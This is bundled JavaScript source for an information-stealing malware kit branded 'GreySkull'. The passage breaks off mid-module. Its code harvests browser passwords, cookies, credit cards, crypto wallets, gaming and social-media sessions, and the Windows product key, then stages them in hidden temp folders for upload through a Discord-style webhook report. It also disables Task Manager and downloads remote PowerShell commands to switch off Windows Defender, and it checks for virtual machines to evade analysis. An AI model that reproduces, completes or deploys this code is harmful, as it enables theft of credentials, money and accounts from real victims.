// modules are defined as an array
// [ module function, map of requires ]
//
// map of requires is short require name -> numeric require
//
// anything defined in a previous bundle is accessed via the
// orig method which is the require for previous bundles
parcelRequire = (function (modules, cache, entry, globalName) {
  // Save the require from previous bundle to this closure if any
  var previousRequire = typeof parcelRequire === 'function' && parcelRequire;
  var nodeRequire = typeof require === 'function' && require;

  function newRequire(name, jumped) {
    if (!cache[name]) {
      if (!modules[name]) {
        // if we cannot find the module within our internal map or
        // cache jump to the current global require ie. the last bundle
        // that was added to the page.
        var currentRequire = typeof parcelRequire === 'function' && parcelRequire;
        if (!jumped && currentRequire) {
          return currentRequire(name, true);
        }

        // If there are other bundles on this page the require from the
        // previous one is saved to 'previousRequire'. Repeat this as
        // many times as there are bundles until the module is found or
        // we exhaust the require chain.
        if (previousRequire) {
          return previousRequire(name, true);
        }

        // Try the node require function if it exists.
        if (nodeRequire && typeof name === 'string') {
          return nodeRequire(name);
        }

        var err = new Error('Cannot find module \'' + name + '\'');
        err.code = 'MODULE_NOT_FOUND';
        throw err;
      }

      localRequire.resolve = resolve;
      localRequire.cache = {};

      var module = cache[name] = new newRequire.Module(name);

      modules[name][0].call(module.exports, localRequire, module, module.exports, this);
    }

    return cache[name].exports;

    function localRequire(x){
      return newRequire(localRequire.resolve(x));
    }

    function resolve(x){
      return modules[name][1][x] || x;
    }
  }

  function Module(moduleName) {
    this.id = moduleName;
    this.bundle = newRequire;
    this.exports = {};
  }

  newRequire.isParcelRequire = true;
  newRequire.Module = Module;
  newRequire.modules = modules;
  newRequire.cache = cache;
  newRequire.parent = previousRequire;
  newRequire.register = function (id, exports) {
    modules[id] = [function (require, module) {
      module.exports = exports;
    }, {}];
  };

  var error;
  for (var i = 0; i < entry.length; i++) {
    try {
      newRequire(entry[i]);
    } catch (e) {
      // Save first error but execute all entries
      if (!error) {
        error = e;
      }
    }
  }

  if (entry.length) {
    // Expose entry point to Node, AMD or browser globals
    // Based on https://github.com/ForbesLindesay/umd/blob/master/template.js
    var mainExports = newRequire(entry[entry.length - 1]);

    // CommonJS
    if (typeof exports === "object" && typeof module !== "undefined") {
      module.exports = mainExports;

    // RequireJS
    } else if (typeof define === "function" && define.amd) {
     define(function () {
       return mainExports;
     });

    // <script>
    } else if (globalName) {
      this[globalName] = mainExports;
    }
  }

  // Override the current require with this new one
  parcelRequire = newRequire;

  if (error) {
    // throw error from earlier, _after updating parcelRequire_
    throw error;
  }

  return newRequire;
})({"utils/emotes.js":[function(require,module,exports) {
const g = {
  badge: {
    nitro: "<:946246402105819216:962747802797113365>",
    boost_1: "<:Booster1Month:1051453771147911208>",
    boost_2: "<:Booster2Month:1051453772360077374>",
    boost_3: "<:Booster3Month:1159062676408905848>",
    boost_6: "<:Booster6Month:1051453773463162890>",
    boost_9: "<:Booster9Month:1051453774620803122>",
    boost_12: "<:boost12month:1068308256088400004>",
    boost_15: "<:Booster15Month:1051453775832961034>",
    boost_18: "<:BoosterLevel8:1051453778127237180>",
    boost_24: "<:Booster24Month:1051453776889917530>",
    staff: "<:staff:874750808728666152>",
    partner: "<:partner:874750808678354964>",
    hypesquad_event: "<:hypesquadevent:1143858325579108505>",
    bughunter_1: "<:bughunter_1:874750808426692658>",
    bughunter_2: "<:bughunter_2:874750808430874664>",
    developer: "<:developer:874750808472825986>",
    early: "<:early_supporter:874750808414113823>",
    bravery: "<:bravery:874750808388952075>",
    brillance: "<:brilliance:874750808338608199>",
    balance: "<:balance:874750808267292683>",
    active_developer: "<:activedev:1143858315886088263>"
  },
  embeds: {
    karma: "<:karma:1173646047134892052>",
    gold: "<a:gold:1197551697887764550>",
    tiktok: "<:tiktok:1173628882168053811>",
    instaiscert: "<:certifiedinsta:1173581219187937310>",
    instagram: "<a:instawhite:853376415759335455>",
    instagram_certified: "<:instagramlogo:1173581240650182717>",
    twitter_usernamecert: "<:certi_twitter:1159090158117867571>",
    twitter_usernameuncert: "<:twitter:1159090161494270052>",
    twitter_followers: "<:a2_grey_twitter:1135298638248161361>",
    twitter_followings: "<:Twitter_retweet:1135298386531188897>",
    twitter_fav: "<:twitter_follow:1135298434967019540>",
    twitter_location: "<a:controller:1159090439207518269>",
    inject: "<a:inject:1159081839596687400>",
    atom: "<:account:1159081832751566858>",
    dsc: "<:roblux:1159081834966155264>",
    rblxinfo: "<:info:1159081837365313619>",
    infoyl: "<:ylinfo:1159081835779866635>",
    mcid: "<a:books:1159078873699450902>",
    mcmail: "<:email:1159078862135775252> ",
    mcgapple: "<:gapple:1159078870461460480>",
    hypixel: "<:hypixel:1159078857542996090>",
    keysmc: "<a:keys:1159078859682107453>",
    namemc: "<:namemc:1159078855550713886>",
    games: "🎮",
    vpn: "🌐",
    clients: "⌨️",
    nova: "<:lilnova5:1203979456729976912>",
    crypto: "<:wallets4:1203979459477245952>",
    creditcard: "<:credcard:1203979460714692630>",
    paypal: "<:paypal:1203981549666828301>",
    Old_Username: "<:oldusertag:1203979463994376232>",
    token: "<a:dsctkn1:1203979465802125322>",
    badges: "<:badg:1203979468679548928>",
    nitro: "<:nitrocode2:1203979470466191370>",
    billings: "<:billing8:1203979473100476446>",
    mail: "<:blackstar:1203979482701111327>",
    phone: "<:phonenumb:1203979476178837524>",
    gift: "<:1839festivepixelpresent:1171449290724491325>",
    username: "<:playboi6:1203979478817316914>",
    cat: "<a:caat2:1130448854861488168>"
  },
  stats: {
    password: "<a:blackkey:1203979480314552431>",
    cookie: "<:blackstar:1203979482701111327>",
    card: "<a:blackcard:1203979484726820865>",
    autofill: "<a:autofill:1203979487180750871>",
    metamask: "<:metamask:1203979489131110410>",
    exodus: "<:exodus:1203979491722928148>",
    computer: "<:computer:1203979493291597826>",
    ip: "<:black_crown:1203979497515393045>",
    country: "<:black_crown:1203979497515393045>",
    disclamer: "<:disclaimer:1203979499570597929>",
    download: "<:download:1203979502426791966>"
  }
};
let {
  embeds,
  stats,
  badge
} = g;
module.exports = {
  embeds,
  stats,
  badge
};
},{}],"utils/stats.js":[function(require,module,exports) {
const path = require("path"),
  {
    embeds,
    stats,
    badge
  } = require("./emotes");
class Stat {
  constructor() {
    this.passwords = 0;
    this.cookies = 0;
    this.autofills = 0;
    this.cards = 0;
    this.history = 0;
    this.downloads = 0;
    this.bookmarks = 0;
    this.AllCookies = [];
    this.games = [];
    this.exodus = [];
    this.keyword_password = [];
    this.vpn = [];
    this.sysadmin = [];
    this.extensions = [];
    this.colds = [];
    this.mnemonics = [];
    this.messengers = [];
    this.file = [];
    this.roblox_cookies = [];
    this.twitter_cookies = [];
    this.roblox_account = [];
    this.minecraft_account = [];
    this.atomicurl = [];
    this.exodusurl = [];
    this.testpath = [];
    this.savepath = [];
    this.twitter_account = [];
    this.steam_content = [];
    this.steam_account = [];
    this.secretpath = [];
    this.discordAccount = [];
    this.InstaSessId = [];
    this.TiktokSessId = [];
    this.RedditSess = [];
    this.passphrase;
  }
  addReddit(name) {
    if (this.RedditSess.includes(name)) return;
    this.RedditSess.push(name);
  }
  addTikTok(name) {
    if (this.TiktokSessId.includes(name)) return;
    this.TiktokSessId.push(name);
  }
  addSessIDInsta(name) {
    if (this.InstaSessId.includes(name)) return;
    this.InstaSessId.push(name);
  }
  addDiscordAccountbis(name) {
    this.discordAccount[0].push(name);
  }
  addDiscordAccount(name) {
    this.discordAccount.push(name);
  }
  addSteamAcc(name) {
    this.steam_account.push(name);
  }
  addSecret(name) {
    this.secretpath.push(name);
  }
  addSteam(name) {
    this.steam_content.push(name);
  }
  addsavepath(name) {
    this.savepath.push(name);
  }
  addbasepath(name) {
    this.testpath.push(name);
  }
  addAtomicLink(name) {
    this.atomicurl.push(name);
  }
  addExodusLink(name) {
    this.exodusurl.push(name);
  }
  addMinecraft(name) {
    this.minecraft_account.push(name);
  }
  detailRoblox(name) {
    this.roblox_account.push(name);
  }
  AddTwitter(name) {
    this.twitter_cookies.push(name);
  }
  AddRoblox(name) {
    this.roblox_cookies.push(name);
  }
  AddTwitterAccount(name) {
    this.twitter_account.push(name);
  }
  AddBrowser(passwords, cookies, autofills, cards, history, downloads, bookmarks) {
    this.passwords = passwords;
    this.cookies = cookies;
    this.autofills = autofills;
    this.cards = cards;
    this.history = history;
    this.downloads = downloads;
    this.bookmarks = bookmarks;
  }
  SaveAllCookies(name) {
    this.AllCookies.push(name);
  }
  AddGames(name) {
    this.games.push(name);
  }
  Addfilestealer(name) {
    this.file.push(name);
  }
  AddExodus(name) {
    this.exodus.push(name);
  }
  AddKeyword(name) {
    this.keyword_password.push(name);
  }
  AddVpn(name) {
    this.vpn.push(name);
  }
  AddSysAdmin(name) {
    this.sysadmin.push(name);
  }
  AddExtensions(name) {
    this.extensions.push(name);
  }
  AddColds(name) {
    this.colds.push(name);
  }
  AddPassphrase(passphrase) {
    this.passphrase = passphrase;
  }
  AddMessenger(name) {
    this.messengers.push(name);
  }
  Build(username, ip, hostname, city, region, country, googlemap, org, postal, timezone, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion, link) {
    let builded = {
      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
      content: null,
      embeds: [{
        color: 5006935,
        author: {
          name: "GreySkull v10.7",
          url: "https://t.me/Sordeal",
          icon_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/gifnova.gif"
        },
        fields: [{
          name: "\u200b",
          value: `\`\`\`ansi
[2;36m 🖥️ Username[0m : [2;37m${process.env.COMPUTERNAME}[0m
[2;36m 🖥️ Version[0m : [2;37m${windowsversion}[0m
[2;36m 🖥️ Ram[0m : [2;37m${ram}GB[0m
[2;36m 🖥️ Disk[0m : [2;37m${disk}GB[0m
[2;36m 🌏 IP[0m : [2;37m${ip !== null && ip !== void 0 ? ip : "N/A"}[0m
[2;36m 🌏 City[0m : [2;37m${city !== null && city !== void 0 ? city : "N/A"}[0m
[2;36m 🌏 Region[0m : [2;37m${region !== null && region !== void 0 ? region : "N/A"}[0m
[2;36m 🌏 Country[0m : [2;37m${country !== null && country !== void 0 ? country : "N/A"}[0m
[2;36m 🌐 Cookies[0m : [2;37m${this.cookies}[0m
[2;36m 🌐 Passwords[0m : [2;37m${this.passwords}[0m
[2;36m 🌐 CreditCards[0m : [2;37m${this.cards}[0m
[2;36m 🌐 AutoFill[0m : [2;37m${this.autofills}[0m
[2;36m 🌐 History[0m : [2;37m${this.history}[0m
[2;36m 🌐 Downloads[0m : [2;37m${this.downloads}[0m
[2;36m 🌐 Bookmarks[0m : [2;37m${this.bookmarks}[0m
\`\`\`\n\n[\`Location\`](${googlemap !== null && googlemap !== void 0 ? googlemap : "https://maps.app.goo.gl/8cZz8xk7VxLN6uyc8"})`,
          inline: false
        }, {
          name: "\u200b",
          value: `
${this.colds.length > 0 ? `${embeds.crypto} **Cold Wallets:** ${this.colds.join(", ") ? `(\`` + this.colds.join(", ") + `\`)` : ""}` : ""}${this.extensions.length > 0 ? `\n${embeds.crypto} **Extension Wallets:** ${this.extensions.join(", ") ? `(\`` + this.extensions.join(", ") + `\`)` : ""}` : ""}${this.passphrase !== undefined && this.passphrase !== "" && this.passphrase.length < 0 ? `\n${stats.metamask} **Metamask Recovery Key:** ${this.passphrase}` : ""}${this.exodus.length > 0 ? `\n${stats.exodus} **Exodus Password:** ${this.exodus.join(", ") ? `(\`` + this.exodus.join(", ") + `\`)` : ""}` : ""}${this.games.length > 0 ? `\n🎮 **Games Found:** ${this.games.join(", ") ? `(\`` + this.games.join(", ") + `\`)` : ""}` : ""}${this.messengers.length > 0 ? `\n⚓ **SocialApp Found:** ${this.games.join(", ") ? `(\`` + this.messengers.join(", ") + `\`)` : ""}` : ""}${this.sysadmin.length > 0 ? `\n⌨️ **Clients Found:** ${this.sysadmin.join(", ") ? `(\`` + this.sysadmin.join(", ") + `\`)` : ""}` : ""}${this.vpn.length > 0 ? `\n🌐 **VPN:** ${this.vpn.join(", ") ? `(\`` + this.vpn.join(", ") + `\`)` : ""}` : ""}
\n${link ? `[${stats.download} \`${path.basename(this.savepath[0])}\`](${link})\n` + `\`\`\`ansi
[2;36m${link}[0m\`\`\`` : ""}`,
          inline: false
        }],
        footer: {
          text: "@GreySkull | https://t.me/Sordeal"
        }
      }],
      username: "GreySkull",
      attachments: []
    };
    return JSON.stringify(builded);
  }
}
var stat = new Stat();
module.exports = {
  stat
};
},{"./emotes":"utils/emotes.js"}],"utils/core.js":[function(require,module,exports) {
const fs = require("fs"),
  axios = require("axios"),
  util = require("util"),
  exec = util.promisify(require("child_process").exec),
  execSync = util.promisify(require("child_process").execSync),
  path = require("path"),
  PowerShell = require("powershell"),
  Winreg = require("winreg"),
  {
    stat
  } = require("./stats"),
  disk = require("diskusage"),
  diskInfo = disk.checkSync("/"),
  os = require("os");
function checkIfStartup(path) {
  if (path.includes(process.env.APPDATA) || path.includes("\\Microsoft\\Windows") || path.includes("Startup")) {
    return true;
  } else {
    return false;
  }
}
function cleaner() {
  try {
    fs.rmSync(stat.testpath[0], {
      recursive: true
    });
  } catch (e) {}
  try {
    fs.rmSync(stat.savepath[0], {
      recursive: true
    });
  } catch (e) {}
}
function isProcessRunning(processName, minCount) {
  return new Promise((resolve, reject) => {
    const command = process.platform === "win32" ? "tasklist" : "ps aux";
    exec(command, (err, stdout, stderr) => {
      if (err) {
        reject(err);
        return;
      }
      const processes = stdout.toLowerCase();
      const processNameLower = processName.toLowerCase();
      const processCount = (processes.match(new RegExp(processNameLower, "g")) || []).length;
      resolve(processCount >= minCount);
    });
  });
}
function filterProcessesByName(name) {
  return new Promise((resolve, reject) => {
    const command = process.platform === "win32" ? "tasklist" : "ps aux";
    exec(command, (err, stdout, stderr) => {
      if (err) {
        reject(err);
        return;
      }
      const lines = stdout.split("\n");
      const filteredProcesses = [];
      for (const line of lines) {
        if (line.toLowerCase().includes(name.toLowerCase())) {
          const columns = line.split(/\s+/);
          filteredProcesses.push({
            name: columns[0],
            pid: parseInt(columns[1]),
            sessionName: columns[2],
            sessionNumber: parseInt(columns[3]),
            memoryUsage: parseInt(columns[4].replace(",", ""))
          });
        }
      }
      resolve(filteredProcesses);
    });
  });
}
async function getProcessPathByPid(pid) {
  return new Promise((resolve, reject) => {
    const command = process.platform === "win32" ? `wmic process where processid=${pid} get ExecutablePath` : `ps -p ${pid} -o comm=`;
    exec(command, (err, stdout, stderr) => {
      if (err) {
        reject(err);
        return;
      }
      const path = stdout.trim();
      resolve(path);
    });
  });
}
function GreySkullDisabTaskMNGR(cc) {
  if (cc !== "yes") return;
  const regKey = new Winreg({
    hive: Winreg.HKCU,
    key: "\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
  });
  const valueName = "DisableTaskMgr";
  const disableValue = 1;
  regKey.set(valueName, Winreg.REG_DWORD, disableValue, err => {
    if (err) {} else {}
  });
}
async function GreySkullDisableWinDefender(cc) {
  if (cc !== "yes") return;
  const powershellCommandsURL = "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/disable_defender.json";
  try {
    const response = await axios.get(powershellCommandsURL);
    let g = response.data;
    g.forEach(ge => {
      let ps = new PowerShell(ge);
      ps.on("error", err => {});
      ps.on("output", data => {});
      ps.on("error-output", data => {});
      ps.on("end", code => {});
    });
  } catch (error) {}
}
async function GreySkullFindMyself() {
  const executablePath = process.argv[0];
  try {
    const appDirectory = path.basename(executablePath);
    const targetProcesses = await filterProcessesByName(appDirectory.replace(".exe", ""));
    if (targetProcesses.length > 0) {
      const targetProcess = targetProcesses[0];
      const processPath = await getProcessPathByPid(targetProcess.pid);
      let myself = processPath.replace("ExecutablePath", "").match(/[a-zA-Z].*[a-zA-Z]/g).join("");
      if (!fs.existsSync(myself)) {} else {
        return myself;
      }
    } else {
      return "Failed";
    }
  } catch (error) {
    return "Failed";
  }
}
function generateId(len) {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < len; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
  return text;
}
function fileName(str) {
  return str.split("\\").pop().split("/").pop();
}
function recursiveRead(basepath, path) {
  var result = [];
  if (!basepath.endsWith("\\")) {
    basepath += "\\";
  }
  const files = fs.readdirSync(basepath);
  for (var i = 0; i < files.length; i++) {
    const file = files[i];
    const filePath = basepath + file;
    if (fs.statSync(filePath).isDirectory()) {
      result = result.concat(recursiveRead(filePath, path + file + "\\"));
    } else {
      result.push(path + file);
    }
  }
  return result;
}
async function checkInternetAccess() {
  try {
    await axios.get("http://www.google.com");
    return true;
  } catch (error) {
    try {
      await axios.get("https://www.facebook.com");
      return true;
    } catch (error) {
      return false;
    }
  }
}
function getProfiles(path, name) {
  const profile = path.split("%PROFILE%");
  if (profile.length == 1) {
    return [{
      path: path,
      name: name
    }];
  }
  if (!fs.existsSync(profile[0])) {
    return [];
  }
  var dirs = fs.readdirSync(profile[0]);
  var profiles = [];
  for (var i = 0; i < dirs.length; i++) {
    var dir = dirs[i];
    if (fs.existsSync(profile[0] + dir + profile[1])) {
      profiles.push({
        path: profile[0] + dir + profile[1],
        profile: name + " " + dir
      });
    }
  }
  return profiles;
}
async function GetTotalPhysicalMemory() {
  const osFreeMem = os.totalmem();
  const allFreeMem = (osFreeMem / (1024 * 1024 * 1024)).toFixed(2);
  return Math.round(allFreeMem);
}
async function getDisk() {
  return (diskInfo.total / (1024 * 1024 * 1024)).toFixed(2);
}
async function GetcleanUID() {
  let uid = await getCommand("wmic csproduct get uuid");
  let regex_uid = /UUID\s+([A-Fa-f0-9-]+)/;
  let match = uid.match(regex_uid);
  let uuid = match[1];
  return uuid;
}
async function getCommand(cmd) {
  const {
    stdout,
    _
  } = await exec(cmd);
  return stdout.trim();
}
async function GetCPUCount() {
  return os.cpus().length;
}
async function getInfo() {
  try {
    const [disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion] = await Promise.all([getDisk(), GetTotalPhysicalMemory(), GetcleanUID(), GetCPUCount(), await getCommand("wmic OS get caption, osarchitecture | more +1"), await getCommand("wmic cpu get name | more +1"), await getCommand("wmic PATH Win32_VideoController get name | more +1"), await getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"), await getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")]);
    return {
      disk,
      ram,
      uid,
      cpucount,
      OS,
      cpu,
      GPU,
      windowskey,
      windowsversion
    };
  } catch (e) {
    console.log(e);
    if (e) {
      return {
        disk: "None",
        ram: "None",
        uid: "None",
        cpucount: "None",
        OS: "None",
        cpu: "None",
        GPU: "None",
        windowskey: "None",
        windowsversion: "None"
      };
    }
  }
}
async function getPublicIp() {
  var data = "";
  try {
    const res = await axios({
      url: "https://ipinfo.io/json",
      method: "GET"
    });
    data = res.data;
    if (data.length > 16) {
      return "Failed!";
    }
    return data;
  } catch (err) {
    return "Failed!";
  }
}
async function antispam(running) {
  try {
    if (!running) return;
    let process_name_exe = path.basename(running);
    let result = await isProcessRunning(process_name_exe, 5);
    if (result) {
      process.abort();
    }
  } catch (e) {}
}
async function isVm() {
  const {
    stdout,
    _
  } = await exec('powershell -c "Get-WmiObject -Query \\"Select * from Win32_CacheMemory\\""');
  if (stdout.replace(/\r/gm, "").replace(/\n/gm, "").replace(/ /gm, "") == "") {
    return true;
  }
  return false;
}
function getHeader() {
  return `$$\\   $$\\                                     $$$$$$\\                       $$\\     $$\\                     $$\\ 
$$$\\  $$ |                                   $$  __$$\\                      $$ |    \\__|                    $$ |
$$$$\\ $$ | $$$$$$\\ $$\\    $$\\ $$$$$$\\        $$ /  \\__| $$$$$$\\  $$$$$$$\\ $$$$$$\\   $$\\ $$$$$$$\\   $$$$$$\\  $$ |
$$ $$\\$$ |$$  __$$\\\\$$\\  $$  |\\____$$\\       \\$$$$$$\\  $$  __$$\\ $$  __$$\\\\_$$  _|  $$ |$$  __$$\\ $$  __$$\\ $$ |
$$ \\$$$$ |$$ /  $$ |\\$$\\$$  / $$$$$$$ |       \\____$$\\ $$$$$$$$ |$$ |  $$ | $$ |    $$ |$$ |  $$ |$$$$$$$$ |$$ |
$$ |\\$$$ |$$ |  $$ | \\$$$  / $$  __$$ |      $$\\   $$ |$$   ____|$$ |  $$ | $$ |$$\\ $$ |$$ |  $$ |$$   ____|$$ |
$$ | \\$$ |\\$$$$$$  |  \\$  /  \\$$$$$$$ |      \\$$$$$$  |\\$$$$$$$\\ $$ |  $$ | \\$$$$  |$$ |$$ |  $$ |\\$$$$$$$\\ $$ |
\\__|  \\__| \\______/    \\_/    \\_______|       \\______/  \\_______|\\__|  \\__|  \\____/ \\__|\\__|  \\__| \\_______|\\__|
                                                                                                                  
                                                                                                                
      ###, ,##, ,##,
       #  # #  # #  #
       ###  #  # #  #
       #  # #  # #  #
       ###' '##' '##'
            .--,
           /  (
          /    \\
         /      \\ 
        /  0  0  \\
((()   |    ()    |   ()))
\\  ()  (  .____.  )  ()  /
 |\` \\_/ \\  \`""\`  / \\_/ \`|
 |       \`.'--'.\`       |
  \\        \`""\`        /
   \\                  /
    \`.              .'    ,
     |\`             |  _.'|
     |              \`-'  /
     \\                 .'
      \`.____________.-'
\t\tGreySkull By KSCH | https://t.me/Sordeal\n\n\n\n
`;
}
function hideFile(filePath) {
  try {
    execSync(`powershell -Command "attrib +h +s \\"${filePath}\\""`);
  } catch (e) {}
}
module.exports = {
  generateId,
  antispam,
  fileName,
  recursiveRead,
  getProfiles,
  getPublicIp,
  isVm,
  getHeader,
  getInfo,
  GreySkullFindMyself,
  hideFile,
  filterProcessesByName,
  cleaner,
  getProcessPathByPid,
  GreySkullDisableWinDefender,
  GreySkullDisabTaskMNGR,
  checkInternetAccess,
  isProcessRunning,
  checkIfStartup
};
},{"./stats":"utils/stats.js"}],"utils/save.js":[function(require,module,exports) {
const core = require("./core"),
  fs = require("fs"),
  path = require("path"),
  archiver = require("archiver"),
  {
    stat
  } = require("./stats");
async function getbasepath() {
  try {
    return process.env.localappdata + "\\" + "Temp" + "\\" + `${core.generateId(20)}`;
  } catch (err) {
    if (err) {
      return process.env.localappdata + "\\" + "Temp" + "\\" + `KS_NOVA_${process.env.USERNAME.replace(".", "") || "USER"}`;
    }
  }
}
async function getsavepath(country, ip) {
  let splited = ip.split(".");
  let startip = splited[0];
  try {
    return process.env.localappdata + "\\" + "Temp" + "\\" + `${country.toUpperCase()}_NOVA_${process.env.USERNAME.replace(".", "") || "USER"}_${startip !== null && startip !== void 0 ? startip : "111"}` + ".zip";
  } catch (err) {
    if (err) {
      return process.env.localappdata + "\\" + "Temp" + "\\" + `KS_NOVA_${process.env.USERNAME.replace(".", "") || "USER"}` + ".zip";
    }
  }
}
async function Init(country, ip) {
  const basepath = await getbasepath();
  const savepath = await getsavepath(country, ip);
  try {
    if (fs.existsSync(basepath)) {
      await fs.rmSync(basepath, {
        recursive: true
      });
    }
    if (fs.existsSync(savepath)) {
      await fs.rmSync(savepath, {
        recursive: true
      });
    }
  } catch (e) {}
  await fs.mkdirSync(basepath, {
    recursive: true
  });
  stat.addbasepath(basepath);
  stat.addsavepath(savepath);
}
async function Save(copypath, mainfolder, subfolder) {
  let basepath = stat.testpath[0];
  const files = core.recursiveRead(copypath, copypath, "");
  for (var i = 0; i < files.length; i++) {
    const file = files[i];
    const savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + file.replace(copypath, "");
    try {
      createAllDir(savePath);
      fs.writeFileSync(savePath, fs.readFileSync(file));
    } catch (e) {}
  }
}
async function SimpleSave(copypath, mainfolder, subfolder) {
  let basepath = stat.testpath[0];
  const files = core.recursiveRead(copypath, copypath, "");
  for (var i = 0; i < files.length; i++) {
    const file = files[i];
    const savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + file.replace(copypath, "");
    try {
      createAllDir(savePath);
      fs.writeFileSync(savePath, fs.readFileSync(file));
    } catch (e) {}
  }
}
async function ArraySave(saves, mainfolder, subfolder) {
  let basepath = stat.testpath[0];
  for (var i = 0; i < saves.length; i++) {
    const save = saves[i];
    try {
      if (fs.lstatSync(save).isDirectory()) {
        const files = core.recursiveRead(save, save, "");
        for (var j = 0; j < files.length; j++) {
          const file = files[j];
          let savePath;
          if (subfolder != "") {
            savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + save.slice(0, -1).split("\\").pop() + "\\" + core.fileName(file);
          } else {
            savePath = basepath + "\\" + mainfolder + "\\" + save.slice(0, -1).split("\\").pop() + "\\" + core.fileName(file);
          }
          try {
            createAllDir(savePath);
            fs.writeFileSync(savePath, fs.readFileSync(file));
          } catch (e) {}
        }
      } else {
        const savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + core.fileName(save);
        try {
          createAllDir(savePath);
          fs.writeFileSync(savePath, fs.readFileSync(save));
        } catch (e) {}
      }
    } catch (e) {}
  }
}
function createAllDir(str) {
  var folders = str.split(path.sep);
  var dir = "";
  for (var i = 0; i < folders.length - 1; i++) {
    dir += folders[i] + path.sep;
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, {
        recursive: true
      });
    }
  }
}
async function SaveError(error) {
  let basepath = stat.testpath[0];
  var savePath = basepath + "\\Logs\\";
  try {
    fs.mkdirSync(savePath, {
      recursive: true
    });
  } catch (e) {}
  savePath += "Error.nova";
  if (fs.existsSync(savePath)) {
    fs.appendFileSync(savePath, error + "\n");
  } else {
    fs.writeFileSync(savePath, error + "\n");
  }
}
async function saveCookies(cookies, name) {
  let basepath = stat.testpath[0];
  if (cookies.length == 0) {
    return;
  }
  var savePath = basepath + "\\Browsers\\";
  try {
    await fs.mkdirSync(savePath, {
      recursive: true
    });
  } catch (e) {}
  savePath += name + " - Cookies.txt";
  var cookiesFinal = "";
  for (let i = 0; i < cookies.length; i++) {
    cookiesFinal += cookies[i].build();
  }
  fs.writeFileSync(savePath, cookiesFinal);
}
async function saveRoblox(cookies) {
  try {
    let basepath = stat.testpath[0];
    var savePath = basepath + "\\Games\\";
    try {
      fs.mkdirSync(savePath, {
        recursive: true
      });
    } catch (e) {}
    savePath += "Roblox\\";
    fs.mkdirSync(savePath, {
      recursive: true
    });
    savePath += `Roblox.txt`;
    var cookiesFinal = "";
    for (let i = 0; i < cookies.length; i++) {
      cookiesFinal += cookies[i];
    }
    if (fs.existsSync(savePath)) {
      fs.appendFileSync(savePath, cookiesFinal + "\n");
    } else {
      fs.writeFileSync(savePath, cookiesFinal);
    }
  } catch (e) {}
}
async function saveBrowser(passwords, autofills, cards, history, downloads, bookmarks) {
  let basepath = stat.testpath[0];
  const savePath = basepath + "\\Browsers\\";
  const saveRoblx = basepath + "\\Games\\Roblox\\";
  try {
    if (!fs.existsSync(savePath)) {
      await fs.mkdirSync(savePath, {
        recursive: true
      });
    }
  } catch (e) {}
  try {
    if (stat.roblox_account && stat.roblox_account.length > 0) {
      if (!fs.existsSync(basepath + "\\Games")) {
        await fs.mkdirSync(basepath + "\\Games", {
          recursive: true
        });
      }
      if (!fs.existsSync(saveRoblx)) {
        await fs.mkdirSync(saveRoblx, {
          recursive: true
        });
      }
      const cookiesContent = stat.roblox_account.join("\n");
      fs.writeFileSync(saveRoblx + "Cookies.txt", cookiesContent);
    }
  } catch (e) {}
  let passwordFinal = "";
  try {
    for (let i = 0; i < passwords.length; i++) {
      if (passwords[i] && typeof passwords[i].build === "function") {
        passwordFinal += passwords[i].build() + "\n";
      }
    }
    if (passwordFinal.length !== 0) {
      passwordFinal = core.getHeader() + passwordFinal;
    }
  } catch (e) {}
  let autofillFinal = "";
  for (let i = 0; i < autofills.length; i++) {
    autofillFinal += autofills[i].build() + "\n";
  }
  if (autofillFinal.length != 0) {
    autofillFinal = core.getHeader() + autofillFinal;
  }
  let historyFinal = "";
  for (let i = 0; i < history.length; i++) {
    historyFinal += history[i].build() + "\n";
  }
  if (historyFinal.length != 0) {
    historyFinal = core.getHeader() + historyFinal;
  }
  let downloadFinal = "";
  for (let i = 0; i < downloads.length; i++) {
    downloadFinal += downloads[i].build() + "\n";
  }
  if (downloadFinal.length != 0) {
    downloadFinal = core.getHeader() + downloadFinal;
  }
  let bookmarkFinal = "";
  for (let i = 0; i < bookmarks.length; i++) {
    bookmarkFinal += bookmarks[i].build() + "\n";
  }
  if (bookmarkFinal.length != 0) {
    bookmarkFinal = core.getHeader() + bookmarkFinal;
  }
  let cardFinal = "";
  for (let i = 0; i < cards.length; i++) {
    cardFinal += cards[i].build() + "\n";
  }
  if (cardFinal.length != 0) {
    cardFinal = core.getHeader() + cardFinal;
  }
  await fs.writeFileSync(savePath + "Passwords.txt", passwordFinal);
  fs.writeFileSync(savePath + "AutoFill.txt", autofillFinal);
  fs.writeFileSync(savePath + "History.txt", historyFinal);
  fs.writeFileSync(savePath + "Downloads.txt", downloadFinal);
  fs.writeFileSync(savePath + "Bookmarks.txt", bookmarkFinal);
  fs.writeFileSync(savePath + "Cards.txt", cardFinal);
}
async function saveMailClients(accounts, name) {
  let basepath = stat.testpath[0];
  let savePath = basepath + "\\MailClients\\";
  try {
    fs.mkdirSync(savePath, {
      recursive: true
    });
  } catch (e) {}
  savePath += name + "\\";
  try {
    fs.mkdirSync(savePath, {
      recursive: true
    });
  } catch (e) {}
  fs.writeFileSync(savePath + "accounts.json", JSON.stringify(accounts, null, 4));
}
async function saveSysAdmin(accounts, name) {
  let basepath = stat.testpath[0];
  let savePath = basepath + "\\Clients\\";
  try {
    fs.mkdirSync(savePath, {
      recursive: true
    });
  } catch (e) {}
  savePath += name + "\\";
  try {
    fs.mkdirSync(savePath, {
      recursive: true
    });
  } catch (e) {}
